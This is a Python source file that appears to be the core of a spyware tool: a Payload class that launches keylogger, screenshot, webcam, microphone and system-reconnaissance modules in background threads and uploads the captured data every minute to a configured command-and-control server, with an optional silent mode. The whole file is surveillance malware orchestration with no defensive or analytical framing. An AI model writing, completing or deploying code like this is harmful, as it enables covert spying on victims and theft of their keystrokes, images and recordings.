import sys
import time
import threading
from core.config import Config
from core.persistence import Persistence
from modules.surveillance.keylogger import Keylogger
from modules.surveillance.screenshot import ScreenshotCapture
from modules.surveillance.webcam import WebcamCapture
from modules.surveillance.microphone import MicrophoneRecorder
from modules.recon.system_info import SystemInfo
from modules.exfiltration.uploader import DataUploader

class Payload:
    def __init__(self, silent=False):
        self.silent = silent
        self.config = Config()
        self.modules = []
        self.uploader = DataUploader(self.config.config['c2_server'])
        
    def start(self):
        """Start all surveillance modules"""
        if not self.silent:
            self._show_menu()
        
        # Initialize modules
        self._init_modules()
        
        # Start modules in separate threads
        for module in self.modules:
            t = threading.Thread(target=module.start)
            t.daemon = True
            t.start()
        
        # Main loop
        while True:
            time.sleep(60)
            self.uploader.upload_data()

    def _init_modules(self):
        """Initialize all surveillance modules"""
        self.modules.extend([
            Keylogger(self.config.config['keylog_interval']),
            ScreenshotCapture(self.config.config['screenshot_interval']),
            WebcamCapture(self.config.config['webcam_interval']),
            MicrophoneRecorder(self.config.config['mic_duration']),
            SystemInfo()
        ])

    def _show_menu(self):
        """Display interactive menu"""
        from utils.menu import Menu
        menu = Menu(self)
        menu.display()
